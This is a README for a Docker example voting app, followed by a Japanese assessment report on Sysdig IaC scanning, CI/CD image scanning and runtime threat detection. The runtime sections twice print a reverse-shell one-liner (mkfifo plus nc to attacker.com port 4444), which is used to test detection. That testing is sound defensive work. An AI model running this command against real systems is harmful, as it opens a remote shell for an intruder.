# Example Voting App

A simple distributed application running across multiple Docker containers.

## Getting started

Download [Docker Desktop](https://www.docker.com/products/docker-desktop) for Mac or Windows. [Docker Compose](https://docs.docker.com/compose) will be automatically installed. On Linux, make sure you have the latest version of [Compose](https://docs.docker.com/compose/install/).

This solution uses Python, Node.js, .NET, with Redis for messaging and Postgres for storage.

Run in this directory to build and run the app:

```shell
docker compose up
```

The `vote` app will be running at [http://localhost:8080](http://localhost:8080), and the `results` will be at [http://localhost:8081](http://localhost:8081).

Alternately, if you want to run it on a [Docker Swarm](https://docs.docker.com/engine/swarm/), first make sure you have a swarm. If you don't, run:

```shell
docker swarm init
```

Once you have your swarm, in this directory run:

```shell
docker stack deploy --compose-file docker-stack.yml vote
```

## Run the app in Kubernetes

The folder k8s-specifications contains the YAML specifications of the Voting App's services.

Run the following command to create the deployments and services. Note it will create these resources in your current namespace (`default` if you haven't changed it.)

```shell
kubectl create -f k8s-specifications/
```

The `vote` web app is then available on port 31000 on each host of the cluster, the `result` web app is available on port 31001.

To remove them, run:

```shell
kubectl delete -f k8s-specifications/
```

## Architecture

![Architecture diagram](architecture.excalidraw.png)

* A front-end web app in [Python](/vote) which lets you vote between two options
* A [Redis](https://hub.docker.com/_/redis/) which collects new votes
* A [.NET](/worker/) worker which consumes votes and stores them in…
* A [Postgres](https://hub.docker.com/_/postgres/) database backed by a Docker volume
* A [Node.js](/result) web app which shows the results of the voting in real time

## Notes

The voting application only accepts one vote per client browser. It does not register additional votes if a vote has already been submitted from a client.

This isn't an example of a properly architected perfectly designed distributed app... it's just a simple
example of the various types of pieces and languages you might see (queues, persistent data, etc), and how to
deal with them in Docker at a basic level.


# 📄 Sysdig TechAssessment - Phase A, B & C 成果レポート

このリポジトリでは、Sysdig Secure を活用したセキュリティ検証（IaC / CI/CD / Runtime）を段階的に実施しました。

---

## 📘 フェーズA：IaCおよびRuntime Policies 初期検証

### ✅ IaC セキュリティスキャン結果（Sysdig CLI Scanner）

- スキャン対象: `k8s-specifications/*.yaml`
- 使用ツール: `sysdig-cli-scanner:1.22.4`
- 実行方法:

```bash
docker run --rm \
  -e SECURE_API_TOKEN=$SYSDIG_SECURE_TOKEN \
  -v $PWD:/iac \
  quay.io/sysdig/sysdig-cli-scanner:1.22.4 \
  --apiurl https://app.au1.sysdig.com \
  --iac scan /iac/k8s-specifications
```

| レベル | 件数 | 内容例 |
|--------|------|--------|
| 🔴 High | 25   | RunAsUser=root, writeable rootFS, NET_RAW許可など |
| 🟠 Medium | 55 | CPU/Memory制限なし, latestタグ, readiness probeなしなど |
| 🟡 Low   | 40 | runAsNonRoot未設定, liveness未定義など |

### 🛠 修正アクション（IaC）

- `securityContext.runAsUser: 1000`
- `readOnlyRootFilesystem: true`
- `capabilities.drop: ["ALL"]`
- `resources.requests/limits` を追加
- `livenessProbe`, `readinessProbe` を明示
- PR #409 にて修正済みYAMLをコミット

### ✅ Runtime Policy 初期実装

- 使用ルール: `Reverse Shell Detected`
- ポリシータイプ: Workload Policy
- スコープ: `container.label.io.kubernetes.pod.namespace is default`
- アクション: `Generate Event`
- 実行コマンド:

```bash
kubectl exec -it vote-XXXXXX -n default -- /bin/sh -c 'rm -f /tmp/f; mkfifo /tmp/f; nc attacker.com 4444 < /tmp/f | /bin/sh > /tmp/f'
```

- Sysdig Secure UI にて検知成功（イベント/プロセス/ユーザー確認済）

---

## 📘 フェーズB：CI/CD 連携によるセキュリティスキャン

### ✅ 実施内容概要

- GitHub Actions を用いた自動スキャン
- 対象：Voting App（vote / worker / result）のDockerイメージと IaCファイル
- 使用アクション：`sysdiglabs/scan-action@v6`

### 🔧 技術構成

- `.github/workflows/sysdig-scan.yml`
- CLIバージョン：`1.22.3`
- Secret：`SYSDIG_SECURE_TOKEN`
- 設定：`continue-on-error: true`

### 🐳 Docker イメージスキャン結果

| サービス | イメージ | 脆弱性数（Critical） | Policy評価 |
|----------|---------|----------------------|------------|
| vote     | vote-app | 113（3件）           | ❌ FAILED  |
| worker   | worker-app | 174（4件）         | ❌ FAILED  |
| result   | result-app | 119（1件）         | ❌ FAILED  |

### 📄 IaC スキャン結果

| レベル | 件数 | 主な検出内容 |
|--------|------|----------------|
| 🔴 High | 25 | serviceAccount未指定, root実行 など |
| 🟠 Medium | 55 | resource未設定, latestタグなど |
| 🟡 Low | 40 | liveness/readiness probe未定義 |

---

## 📘 フェーズC：Runtime Policy による脅威検知

### ✅ 実施内容概要

- `Reverse Shell Detected`, `Unexpected Outbound Connection` を有効化
- namespace=`default` を対象に設定
- イベント：Generate Event, Capture（Kill optional）

### 🛠 実施ステップ

```bash
kubectl exec -it vote-XXXXX -n default -- /bin/sh -c 'rm -f /tmp/f; mkfifo /tmp/f; nc attacker.com 4444 < /tmp/f | /bin/sh > /tmp/f'
```

### 📡 検知ログ（Secure UI）

- Threat：Reverse Shell Detected
- 実行ユーザー：root
- プロセス：`nc.openbsd`, `sh`
- 状態：Open
- Capture：取得済み

---

## ✅ 結論

- ✅ フェーズA：IaC検知 → PR修正、Runtime Policy初期検知を実証
- ✅ フェーズB：CI/CD自動スキャンパイプライン構築
- ✅ フェーズC：Runtime脅威の検出とフォレンジック取得に成功

レポート作成日: 2025-07-21  
作成者: Higaki（SETechAssessment 参加者）
